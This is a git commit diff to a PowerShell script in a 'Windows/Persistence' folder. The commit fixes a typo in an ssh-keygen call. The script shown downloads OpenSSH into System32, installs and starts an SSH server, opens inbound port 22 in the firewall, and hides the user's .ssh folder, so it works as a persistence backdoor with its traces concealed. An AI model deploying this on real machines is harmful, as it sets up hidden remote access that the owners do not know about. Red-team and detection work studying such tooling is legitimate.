b988622c065fe1738b8a4927516be306a7c4a87b
megatop1 <43348736+megatop1@users.noreply.github.com>
2021-12-19 17:37:51 -0500

    Update DeploySSH.ps1

--- Windows/Persistence/DeploySSH.ps1
+++ Windows/Persistence/DeploySSH.ps1
@@ -4,7 +4,7 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem
 Invoke-WebRequest -URI https://github.com/PowerShell/Win32-OpenSSH/releases/download/V8.6.0.0p1-Beta/OpenSSH-Win64.zip -Outfile C:\Windows\System32\OpenSSH-Win64.zip
 [Io.Compression.ZipFile]::ExtractToDirectory("C:\Windows\System32\OpenSSH-Win64.zip", "C:\Windows\System32")
 C:\Windows\System32\OpenSSH-Win64\install-sshd.ps1
-C:\Windows\System32\OpenSSH-Win64\ssh-keygen-t rsa -b 2048
+C:\Windows\System32\OpenSSH-Win64\ssh-keygen -t rsa -b 2048
 Start-Service -Name sshd
 netsh advfirewall firewall add rule name="SSH" dir=in action=allow protocol=TCP localport=22
 attrib +h C:\Users\<user>\.ssh
